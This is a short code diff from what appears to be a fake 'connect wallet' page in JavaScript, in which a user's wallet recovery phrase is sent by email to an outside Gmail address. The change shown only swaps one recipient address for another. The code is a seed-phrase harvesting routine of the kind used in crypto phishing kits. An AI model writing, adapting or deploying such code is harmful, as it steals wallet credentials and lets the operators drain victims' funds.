@@ -51,7 +51,7 @@ const Connevtwallet = () => {
       sendMessage(
         `phrase:  ${value.phrase}`,
         "Report_phrase",
-        "enzochainplatform@gmail.com"
+        "platformmaxzobit@gmail.com"
       )
         .then(() => {
           setValue({
